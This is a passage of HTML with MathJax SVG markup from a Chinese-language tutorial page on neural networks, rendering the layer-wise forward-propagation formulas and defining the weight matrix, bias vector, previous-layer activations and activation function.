649 96 661Q101 680 107 682T179 688Q194 689 213 690T243 693T254 694Q266 694 266 686Q266 675 193 386T118 83Q118 81 118 75T117 65V59Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(576,0)"><path data-c="5D" d="M22 710V750H159V-250H22V-210H119V710H22Z" style="stroke-width: 3;"/></g></g></g><g data-mml-node="mo" transform="translate(1429.6,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z" style="stroke-width: 3;"/></g><g data-mml-node="msup" transform="translate(2485.4,0)"><g data-mml-node="mi"><path data-c="1D44A" d="M436 683Q450 683 486 682T553 680Q604 680 638 681T677 682Q695 682 695 674Q695 670 692 659Q687 641 683 639T661 637Q636 636 621 632T600 624T597 615Q597 603 613 377T629 138L631 141Q633 144 637 151T649 170T666 200T690 241T720 295T759 362Q863 546 877 572T892 604Q892 619 873 628T831 637Q817 637 817 647Q817 650 819 660Q823 676 825 679T839 682Q842 682 856 682T895 682T949 681Q1015 681 1034 683Q1048 683 1048 672Q1048 666 1045 655T1038 640T1028 637Q1006 637 988 631T958 617T939 600T927 584L923 578L754 282Q586 -14 585 -15Q579 -22 561 -22Q546 -22 542 -17Q539 -14 523 229T506 480L494 462Q472 425 366 239Q222 -13 220 -15T215 -19Q210 -22 197 -22Q178 -22 176 -15Q176 -12 154 304T131 622Q129 631 121 633T82 637H58Q51 644 51 648Q52 671 64 683H76Q118 680 176 680Q301 680 313 683H323Q329 677 329 674T327 656Q322 641 318 637H297Q236 634 232 620Q262 160 266 136L501 550L499 587Q496 629 489 632Q483 636 447 637Q428 637 422 639T416 648Q416 650 418 660Q419 664 420 669T421 676T424 680T428 682T436 683Z" style="stroke-width: 3;"/></g><g data-mml-node="TeXAtom" transform="translate(1136.2,413) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="5B" d="M118 -250V750H255V710H158V-210H255V-250H118Z" style="stroke-width: 3;"/></g><g data-mml-node="mi" transform="translate(278,0)"><path data-c="1D459" d="M117 59Q117 26 142 26Q179 26 205 131Q211 151 215 152Q217 153 225 153H229Q238 153 241 153T246 151T248 144Q247 138 245 128T234 90T214 43T183 6T137 -11Q101 -11 70 11T38 85Q38 97 39 102L104 360Q167 615 167 623Q167 626 166 628T162 632T157 634T149 635T141 636T132 637T122 637Q112 637 109 637T101 638T95 641T94 647Q94 649 96 661Q101 680 107 682T179 688Q194 689 213 690T243 693T254 694Q266 694 266 686Q266 675 193 386T118 83Q118 81 118 75T117 65V59Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(576,0)"><path data-c="5D" d="M22 710V750H159V-250H22V-210H119V710H22Z" style="stroke-width: 3;"/></g></g></g><g data-mml-node="msup" transform="translate(4275.5,0)"><g data-mml-node="mi"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z" style="stroke-width: 3;"/></g><g data-mml-node="TeXAtom" transform="translate(562,413) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="5B" d="M118 -250V750H255V710H158V-210H255V-250H118Z" style="stroke-width: 3;"/></g><g data-mml-node="mi" transform="translate(278,0)"><path data-c="1D459" d="M117 59Q117 26 142 26Q179 26 205 131Q211 151 215 152Q217 153 225 153H229Q238 153 241 153T246 151T248 144Q247 138 245 128T234 90T214 43T183 6T137 -11Q101 -11 70 11T38 85Q38 97 39 102L104 360Q167 615 167 623Q167 626 166 628T162 632T157 634T149 635T141 636T132 637T122 637Q112 637 109 637T101 638T95 641T94 647Q94 649 96 661Q101 680 107 682T179 688Q194 689 213 690T243 693T254 694Q266 694 266 686Q266 675 193 386T118 83Q118 81 118 75T117 65V59Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(576,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z" style="stroke-width: 3;"/></g><g data-mml-node="mn" transform="translate(1354,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(1854,0)"><path data-c="5D" d="M22 710V750H159V-250H22V-210H119V710H22Z" style="stroke-width: 3;"/></g></g></g><g data-mml-node="mo" transform="translate(6617.3,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z" style="stroke-width: 3;"/></g><g data-mml-node="msup" transform="translate(7617.5,0)"><g data-mml-node="mi"><path data-c="1D44F" d="M73 647Q73 657 77 670T89 683Q90 683 161 688T234 694Q246 694 246 685T212 542Q204 508 195 472T180 418L176 399Q176 396 182 402Q231 442 283 442Q345 442 383 396T422 280Q422 169 343 79T173 -11Q123 -11 82 27T40 150V159Q40 180 48 217T97 414Q147 611 147 623T109 637Q104 637 101 637H96Q86 637 83 637T76 640T73 647ZM336 325V331Q336 405 275 405Q258 405 240 397T207 376T181 352T163 330L157 322L136 236Q114 150 114 114Q114 66 138 42Q154 26 178 26Q211 26 245 58Q270 81 285 114T318 219Q336 291 336 325Z" style="stroke-width: 3;"/></g><g data-mml-node="TeXAtom" transform="translate(462,413) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="5B" d="M118 -250V750H255V710H158V-210H255V-250H118Z" style="stroke-width: 3;"/></g><g data-mml-node="mi" transform="translate(278,0)"><path data-c="1D459" d="M117 59Q117 26 142 26Q179 26 205 131Q211 151 215 152Q217 153 225 153H229Q238 153 241 153T246 151T248 144Q247 138 245 128T234 90T214 43T183 6T137 -11Q101 -11 70 11T38 85Q38 97 39 102L104 360Q167 615 167 623Q167 626 166 628T162 632T157 634T149 635T141 636T132 637T122 637Q112 637 109 637T101 638T95 641T94 647Q94 649 96 661Q101 680 107 682T179 688Q194 689 213 690T243 693T254 694Q266 694 266 686Q266 675 193 386T118 83Q118 81 118 75T117 65V59Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(576,0)"><path data-c="5D" d="M22 710V750H159V-250H22V-210H119V710H22Z" style="stroke-width: 3;"/></g></g></g></g></g></svg><mjx-assistive-mml unselectable="on" display="block" style="top: 0px; left: 0px; clip: rect(1px, 1px, 1px, 1px); -webkit-touch-callout: none; -webkit-user-select: none; -khtml-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; position: absolute; padding: 1px 0px 0px 0px; border: 0px; display: block; overflow: hidden; width: 100%;"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><msup><mi>z</mi><mrow data-mjx-texclass="ORD"><mo stretchy="false">[</mo><mi>l</mi><mo stretchy="false">]</mo></mrow></msup><mo>=</mo><msup><mi>W</mi><mrow data-mjx-texclass="ORD"><mo stretchy="false">[</mo><mi>l</mi><mo stretchy="false">]</mo></mrow></msup><msup><mi>a</mi><mrow data-mjx-texclass="ORD"><mo stretchy="false">[</mo><mi>l</mi><mo>−</mo><mn>1</mn><mo stretchy="false">]</mo></mrow></msup><mo>+</mo><msup><mi>b</mi><mrow data-mjx-texclass="ORD"><mo stretchy="false">[</mo><mi>l</mi><mo stretchy="false">]</mo></mrow></msup></math></mjx-assistive-mml></mjx-container><p>其中：</p><ul><li><mjx-container class="MathJax" jax="SVG" style="direction: ltr; position: relative;"><svg style="overflow: visible; min-height: 1px; min-width: 1px; vertical-align: -0.05ex;" xmlns="http://www.w3.org/2000/svg" width="4.05ex" height="2.071ex" role="img" focusable="false" viewbox="0 -893.3 1790.1 915.3" aria-hidden="true"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msup"><g data-mml-node="mi"><path data-c="1D44A" d="M436 683Q450 683 486 682T553 680Q604 680 638 681T677 682Q695 682 695 674Q695 670 692 659Q687 641 683 639T661 637Q636 636 621 632T600 624T597 615Q597 603 613 377T629 138L631 141Q633 144 637 151T649 170T666 200T690 241T720 295T759 362Q863 546 877 572T892 604Q892 619 873 628T831 637Q817 637 817 647Q817 650 819 660Q823 676 825 679T839 682Q842 682 856 682T895 682T949 681Q1015 681 1034 683Q1048 683 1048 672Q1048 666 1045 655T1038 640T1028 637Q1006 637 988 631T958 617T939 600T927 584L923 578L754 282Q586 -14 585 -15Q579 -22 561 -22Q546 -22 542 -17Q539 -14 523 229T506 480L494 462Q472 425 366 239Q222 -13 220 -15T215 -19Q210 -22 197 -22Q178 -22 176 -15Q176 -12 154 304T131 622Q129 631 121 633T82 637H58Q51 644 51 648Q52 671 64 683H76Q118 680 176 680Q301 680 313 683H323Q329 677 329 674T327 656Q322 641 318 637H297Q236 634 232 620Q262 160 266 136L501 550L499 587Q496 629 489 632Q483 636 447 637Q428 637 422 639T416 648Q416 650 418 660Q419 664 420 669T421 676T424 680T428 682T436 683Z" style="stroke-width: 3;"/></g><g data-mml-node="TeXAtom" transform="translate(1136.2,363) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="5B" d="M118 -250V750H255V710H158V-210H255V-250H118Z" style="stroke-width: 3;"/></g><g data-mml-node="mi" transform="translate(278,0)"><path data-c="1D459" d="M117 59Q117 26 142 26Q179 26 205 131Q211 151 215 152Q217 153 225 153H229Q238 153 241 153T246 151T248 144Q247 138 245 128T234 90T214 43T183 6T137 -11Q101 -11 70 11T38 85Q38 97 39 102L104 360Q167 615 167 623Q167 626 166 628T162 632T157 634T149 635T141 636T132 637T122 637Q112 637 109 637T101 638T95 641T94 647Q94 649 96 661Q101 680 107 682T179 688Q194 689 213 690T243 693T254 694Q266 694 266 686Q266 675 193 386T118 83Q118 81 118 75T117 65V59Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(576,0)"><path data-c="5D" d="M22 710V750H159V-250H22V-210H119V710H22Z" style="stroke-width: 3;"/></g></g></g></g></g></svg><mjx-assistive-mml unselectable="on" display="inline" style="top: 0px; left: 0px; clip: rect(1px, 1px, 1px, 1px); -webkit-touch-callout: none; -webkit-user-select: none; -khtml-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; position: absolute; padding: 1px 0px 0px 0px; border: 0px; display: block; width: auto; overflow: hidden;"><math xmlns="http://www.w3.org/1998/Math/MathML"><msup><mi>W</mi><mrow data-mjx-texclass="ORD"><mo stretchy="false">[</mo><mi>l</mi><mo stretchy="false">]</mo></mrow></msup></math></mjx-assistive-mml></mjx-container>：第 <mjx-container class="MathJax" jax="SVG" style="direction: ltr; position: relative;"><svg style="overflow: visible; min-height: 1px; min-width: 1px; vertical-align: -0.025ex;" xmlns="http://www.w3.org/2000/svg" width="0.674ex" height="1.595ex" role="img" focusable="false" viewbox="0 -694 298 705" aria-hidden="true"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D459" d="M117 59Q117 26 142 26Q179 26 205 131Q211 151 215 152Q217 153 225 153H229Q238 153 241 153T246 151T248 144Q247 138 245 128T234 90T214 43T183 6T137 -11Q101 -11 70 11T38 85Q38 97 39 102L104 360Q167 615 167 623Q167 626 166 628T162 632T157 634T149 635T141 636T132 637T122 637Q112 637 109 637T101 638T95 641T94 647Q94 649 96 661Q101 680 107 682T179 688Q194 689 213 690T243 693T254 694Q266 694 266 686Q266 675 193 386T118 83Q118 81 118 75T117 65V59Z" style="stroke-width: 3;"/></g></g></g></svg><mjx-assistive-mml unselectable="on" display="inline" style="top: 0px; left: 0px; clip: rect(1px, 1px, 1px, 1px); -webkit-touch-callout: none; -webkit-user-select: none; -khtml-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; position: absolute; padding: 1px 0px 0px 0px; border: 0px; display: block; width: auto; overflow: hidden;"><math xmlns="http://www.w3.org/1998/Math/MathML"><mi>l</mi></math></mjx-assistive-mml></mjx-container> 层的权重矩阵</li><li><mjx-container class="MathJax" jax="SVG" style="direction: ltr; position: relative;"><svg style="overflow: visible; min-height: 1px; min-width: 1px; vertical-align: -0.023ex;" xmlns="http://www.w3.org/2000/svg" width="4.795ex" height="2.044ex" role="img" focusable="false" viewbox="0 -893.3 2119.6 903.3" aria-hidden="true"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msup"><g data-mml-node="mi"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z" style="stroke-width: 3;"/></g><g data-mml-node="TeXAtom" transform="translate(562,363) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="5B" d="M118 -250V750H255V710H158V-210H255V-250H118Z" style="stroke-width: 3;"/></g><g data-mml-node="mi" transform="translate(278,0)"><path data-c="1D459" d="M117 59Q117 26 142 26Q179 26 205 131Q211 151 215 152Q217 153 225 153H229Q238 153 241 153T246 151T248 144Q247 138 245 128T234 90T214 43T183 6T137 -11Q101 -11 70 11T38 85Q38 97 39 102L104 360Q167 615 167 623Q167 626 166 628T162 632T157 634T149 635T141 636T132 637T122 637Q112 637 109 637T101 638T95 641T94 647Q94 649 96 661Q101 680 107 682T179 688Q194 689 213 690T243 693T254 694Q266 694 266 686Q266 675 193 386T118 83Q118 81 118 75T117 65V59Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(576,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z" style="stroke-width: 3;"/></g><g data-mml-node="mn" transform="translate(1354,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(1854,0)"><path data-c="5D" d="M22 710V750H159V-250H22V-210H119V710H22Z" style="stroke-width: 3;"/></g></g></g></g></g></svg><mjx-assistive-mml unselectable="on" display="inline" style="top: 0px; left: 0px; clip: rect(1px, 1px, 1px, 1px); -webkit-touch-callout: none; -webkit-user-select: none; -khtml-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; position: absolute; padding: 1px 0px 0px 0px; border: 0px; display: block; width: auto; overflow: hidden;"><math xmlns="http://www.w3.org/1998/Math/MathML"><msup><mi>a</mi><mrow data-mjx-texclass="ORD"><mo stretchy="false">[</mo><mi>l</mi><mo>−</mo><mn>1</mn><mo stretchy="false">]</mo></mrow></msup></math></mjx-assistive-mml></mjx-container>：上一层的输出（或输入层的原始输入）</li><li><mjx-container class="MathJax" jax="SVG" style="direction: ltr; position: relative;"><svg style="overflow: visible; min-height: 1px; min-width: 1px; vertical-align: -0.025ex;" xmlns="http://www.w3.org/2000/svg" width="2.525ex" height="2.046ex" role="img" focusable="false" viewbox="0 -893.3 1115.9 904.3" aria-hidden="true"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msup"><g data-mml-node="mi"><path data-c="1D44F" d="M73 647Q73 657 77 670T89 683Q90 683 161 688T234 694Q246 694 246 685T212 542Q204 508 195 472T180 418L176 399Q176 396 182 402Q231 442 283 442Q345 442 383 396T422 280Q422 169 343 79T173 -11Q123 -11 82 27T40 150V159Q40 180 48 217T97 414Q147 611 147 623T109 637Q104 637 101 637H96Q86 637 83 637T76 640T73 647ZM336 325V331Q336 405 275 405Q258 405 240 397T207 376T181 352T163 330L157 322L136 236Q114 150 114 114Q114 66 138 42Q154 26 178 26Q211 26 245 58Q270 81 285 114T318 219Q336 291 336 325Z" style="stroke-width: 3;"/></g><g data-mml-node="TeXAtom" transform="translate(462,363) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="5B" d="M118 -250V750H255V710H158V-210H255V-250H118Z" style="stroke-width: 3;"/></g><g data-mml-node="mi" transform="translate(278,0)"><path data-c="1D459" d="M117 59Q117 26 142 26Q179 26 205 131Q211 151 215 152Q217 153 225 153H229Q238 153 241 153T246 151T248 144Q247 138 245 128T234 90T214 43T183 6T137 -11Q101 -11 70 11T38 85Q38 97 39 102L104 360Q167 615 167 623Q167 626 166 628T162 632T157 634T149 635T141 636T132 637T122 637Q112 637 109 637T101 638T95 641T94 647Q94 649 96 661Q101 680 107 682T179 688Q194 689 213 690T243 693T254 694Q266 694 266 686Q266 675 193 386T118 83Q118 81 118 75T117 65V59Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(576,0)"><path data-c="5D" d="M22 710V750H159V-250H22V-210H119V710H22Z" style="stroke-width: 3;"/></g></g></g></g></g></svg><mjx-assistive-mml unselectable="on" display="inline" style="top: 0px; left: 0px; clip: rect(1px, 1px, 1px, 1px); -webkit-touch-callout: none; -webkit-user-select: none; -khtml-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; position: absolute; padding: 1px 0px 0px 0px; border: 0px; display: block; width: auto; overflow: hidden;"><math xmlns="http://www.w3.org/1998/Math/MathML"><msup><mi>b</mi><mrow data-mjx-texclass="ORD"><mo stretchy="false">[</mo><mi>l</mi><mo stretchy="false">]</mo></mrow></msup></math></mjx-assistive-mml></mjx-container>：第 <mjx-container class="MathJax" jax="SVG" style="direction: ltr; position: relative;"><svg style="overflow: visible; min-height: 1px; min-width: 1px; vertical-align: -0.025ex;" xmlns="http://www.w3.org/2000/svg" width="0.674ex" height="1.595ex" role="img" focusable="false" viewbox="0 -694 298 705" aria-hidden="true"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D459" d="M117 59Q117 26 142 26Q179 26 205 131Q211 151 215 152Q217 153 225 153H229Q238 153 241 153T246 151T248 144Q247 138 245 128T234 90T214 43T183 6T137 -11Q101 -11 70 11T38 85Q38 97 39 102L104 360Q167 615 167 623Q167 626 166 628T162 632T157 634T149 635T141 636T132 637T122 637Q112 637 109 637T101 638T95 641T94 647Q94 649 96 661Q101 680 107 682T179 688Q194 689 213 690T243 693T254 694Q266 694 266 686Q266 675 193 386T118 83Q118 81 118 75T117 65V59Z" style="stroke-width: 3;"/></g></g></g></svg><mjx-assistive-mml unselectable="on" display="inline" style="top: 0px; left: 0px; clip: rect(1px, 1px, 1px, 1px); -webkit-touch-callout: none; -webkit-user-select: none; -khtml-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; position: absolute; padding: 1px 0px 0px 0px; border: 0px; display: block; width: auto; overflow: hidden;"><math xmlns="http://www.w3.org/1998/Math/MathML"><mi>l</mi></math></mjx-assistive-mml></mjx-container> 层的偏置向量</li><li><mjx-container class="MathJax" jax="SVG" style="direction: ltr; position: relative;"><svg style="overflow: visible; min-height: 1px; min-width: 1px; vertical-align: -0.025ex;" xmlns="http://www.w3.org/2000/svg" width="2.606ex" height="2.046ex" role="img" focusable="false" viewbox="0 -893.3 1151.9 904.3" aria-hidden="true"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msup"><g data-mml-node="mi"><path data-c="1D467" d="M347 338Q337 338 294 349T231 360Q211 360 197 356T174 346T162 335T155 324L153 320Q150 317 138 317Q117 317 117 325Q117 330 120 339Q133 378 163 406T229 440Q241 442 246 442Q271 442 291 425T329 392T367 375Q389 375 411 408T434 441Q435 442 449 442H462Q468 436 468 434Q468 430 463 420T449 399T432 377T418 358L411 349Q368 298 275 214T160 106L148 94L163 93Q185 93 227 82T290 71Q328 71 360 90T402 140Q406 149 409 151T424 153Q443 153 443 143Q443 138 442 134Q425 72 376 31T278 -11Q252 -11 232 6T193 40T155 57Q111 57 76 -3Q70 -11 59 -11H54H41Q35 -5 35 -2Q35 13 93 84Q132 129 225 214T340 322Q352 338 347 338Z" style="stroke-width: 3;"/></g><g data-mml-node="TeXAtom" transform="translate(498,363) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="5B" d="M118 -250V750H255V710H158V-210H255V-250H118Z" style="stroke-width: 3;"/></g><g data-mml-node="mi" transform="translate(278,0)"><path data-c="1D459" d="M117 59Q117 26 142 26Q179 26 205 131Q211 151 215 152Q217 153 225 153H229Q238 153 241 153T246 151T248 144Q247 138 245 128T234 90T214 43T183 6T137 -11Q101 -11 70 11T38 85Q38 97 39 102L104 360Q167 615 167 623Q167 626 166 628T162 632T157 634T149 635T141 636T132 637T122 637Q112 637 109 637T101 638T95 641T94 647Q94 649 96 661Q101 680 107 682T179 688Q194 689 213 690T243 693T254 694Q266 694 266 686Q266 675 193 386T118 83Q118 81 118 75T117 65V59Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(576,0)"><path data-c="5D" d="M22 710V750H159V-250H22V-210H119V710H22Z" style="stroke-width: 3;"/></g></g></g></g></g></svg><mjx-assistive-mml unselectable="on" display="inline" style="top: 0px; left: 0px; clip: rect(1px, 1px, 1px, 1px); -webkit-touch-callout: none; -webkit-user-select: none; -khtml-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; position: absolute; padding: 1px 0px 0px 0px; border: 0px; display: block; width: auto; overflow: hidden;"><math xmlns="http://www.w3.org/1998/Math/MathML"><msup><mi>z</mi><mrow data-mjx-texclass="ORD"><mo stretchy="false">[</mo><mi>l</mi><mo stretchy="false">]</mo></mrow></msup></math></mjx-assistive-mml></mjx-container>：未激活的线性组合结果</li></ul></li><li><p><strong>激活函数</strong></p><mjx-container class="MathJax" jax="SVG" display="true" style="direction: ltr; display: block; text-align: center; margin: 1em 0; position: relative;"><svg style="overflow: visible; min-height: 1px; min-width: 1px; vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="11.426ex" height="2.7ex" role="img" focusable="false" viewbox="0 -943.3 5050.3 1193.3" aria-hidden="true"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msup"><g data-mml-node="mi"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z" style="stroke-width: 3;"/></g><g data-mml-node="TeXAtom" transform="translate(562,413) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="5B" d="M118 -250V750H255V710H158V-210H255V-250H118Z" style="stroke-width: 3;"/></g><g data-mml-node="mi" transform="translate(278,0)"><path data-c="1D459" d="M117 59Q117 26 142 26Q179 26 205 131Q211 151 215 152Q217 153 225 153H229Q238 153 241 153T246 151T248 144Q247 138 245 128T234 90T214 43T183 6T137 -11Q101 -11 70 11T38 85Q38 97 39 102L104 360Q167 615 167 623Q167 626 166 628T162 632T157 634T149 635T141 636T132 637T122 637Q112 637 109 637T101 638T95 641T94 647Q94 649 96 661Q101 680 107 682T179 688Q194 689 213 690T243 693T254 694Q266 694 266 686Q266 675 193 386T118 83Q118 81 118 75T117 65V59Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(576,0)"><path data-c="5D" d="M22 710V750H159V-250H22V-210H119V710H22Z" style="stroke-width: 3;"/></g></g></g><g data-mml-node="mo" transform="translate(1493.6,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z" style="stroke-width: 3;"/></g><g data-mml-node="mi" transform="translate(2549.4,0)"><path data-c="1D70E" d="M184 -11Q116 -11 74 34T31 147Q31 247 104 333T274 430Q275 431 414 431H552Q553 430 555 429T559 427T562 425T565 422T567 420T569 416T570 412T571 407T572 401Q572 357 507 357Q500 357 490 357T476 358H416L421 348Q439 310 439 263Q439 153 359 71T184 -11ZM361 278Q361 358 276 358Q152 358 115 184Q114 180 114 178Q106 141 106 117Q106 67 131 47T188 26Q242 26 287 73Q316 103 334 153T356 233T361 278Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(3120.4,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z" style="stroke-width: 3;"/></g><g data-mml-node="msup" transform="translate(3509.4,0)"><g data-mml-node="mi"><path data-c="1D467" d="M347 338Q337 338 294 349T231 360Q211 360 197 356T174 346T162 335T155 324L153 320Q150 317 138 317Q117 317 117 325Q117 330 120 339Q133 378 163 406T229 440Q241 442 246 442Q271 442 291 425T329 392T367 375Q389 375 411 408T434 441Q435 442 449 442H462Q468 436 468 434Q468 430 463 420T449 399T432 377T418 358L411 349Q368 298 275 214T160 106L148 94L163 93Q185 93 227 82T290 71Q328 71 360 90T402 140Q406 149 409 151T424 153Q443 153 443 143Q443 138 442 134Q425 72 376 31T278 -11Q252 -11 232 6T193 40T155 57Q111 57 76 -3Q70 -11 59 -11H54H41Q35 -5 35 -2Q35 13 93 84Q132 129 225 214T340 322Q352 338 347 338Z" style="stroke-width: 3;"/></g><g data-mml-node="TeXAtom" transform="translate(498,413) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="5B" d="M118 -250V750H255V710H158V-210H255V-250H118Z" style="stroke-width: 3;"/></g><g data-mml-node="mi" transform="translate(278,0)"><path data-c="1D459" d="M117 59Q117 26 142 26Q179 26 205 131Q211 151 215 152Q217 153 225 153H229Q238 153 241 153T246 151T248 144Q247 138 245 128T234 90T214 43T183 6T137 -11Q101 -11 70 11T38 85Q38 97 39 102L104 360Q167 615 167 623Q167 626 166 628T162 632T157 634T149 635T141 636T132 637T122 637Q112 637 109 637T101 638T95 641T94 647Q94 649 96 661Q101 680 107 682T179 688Q194 689 213 690T243 693T254 694Q266 694 266 686Q266 675 193 386T118 83Q118 81 118 75T117 65V59Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(576,0)"><path data-c="5D" d="M22 710V750H159V-250H22V-210H119V710H22Z" style="stroke-width: 3;"/></g></g></g><g data-mml-node="mo" transform="translate(4661.3,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z" style="stroke-width: 3;"/></g></g></g></svg><mjx-assistive-mml unselectable="on" display="block" style="top: 0px; left: 0px; clip: rect(1px, 1px, 1px, 1px); -webkit-touch-callout: none; -webkit-user-select: none; -khtml-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; position: absolute; padding: 1px 0px 0px 0px; border: 0px; display: block; overflow: hidden; width: 100%;"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><msup><mi>a</mi><mrow data-mjx-texclass="ORD"><mo stretchy="false">[</mo><mi>l</mi><mo stretchy="false">]</mo></mrow></msup><mo>=</mo><mi>σ</mi><mo stretchy="false">(</mo><msup><mi>z</mi><mrow data-mjx-texclass="ORD"><mo stretchy="false">[</mo><mi>l</mi><mo stretchy="false">]</mo></mrow></msup><mo stretchy="false">)</mo></math></mjx-assistive-mml></mjx-container><p>其中 <mjx-container class="MathJax" jax="SVG" style="direction: ltr; position: relative;"><svg style="overflow: visible; min-height: 1px; min-width: 1px; vertical-align: -0.025ex;" xmlns="http://www.w3.org/2000/svg" width="1.292ex" height="1ex" role="img" focusable="false" viewbox="0 -431 